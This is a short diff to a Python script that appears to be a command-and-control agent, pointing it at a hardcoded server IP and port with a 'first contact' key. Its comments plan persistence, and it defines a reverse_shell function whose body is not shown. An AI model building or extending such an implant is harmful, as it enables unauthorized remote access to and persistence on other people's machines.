@@ -5,9 +5,7 @@ import json
 import platform
 import subprocess
 import random
-import getpass 
-import pty 
-import socket 
+import getpass  
 import os 
 
 """
@@ -28,9 +26,10 @@ TODO4: Create persistence on the script itself.
 # TODO: This agent is turning into a mess, I need a proper agent class 
 # with proper functions 
 
-# This is hardcoded, for now 
+# This is hardcoded, for now  
 SERVERIP = '192.168.172.147'
-URL = 'http://localhost:5000'
+PORT = 5000 
+URL = 'http://'+SERVERIP+':'+str(PORT)
 FIRSTCONTACTKEY = 'firstcontactkey'
 
 def reverse_shell(port):
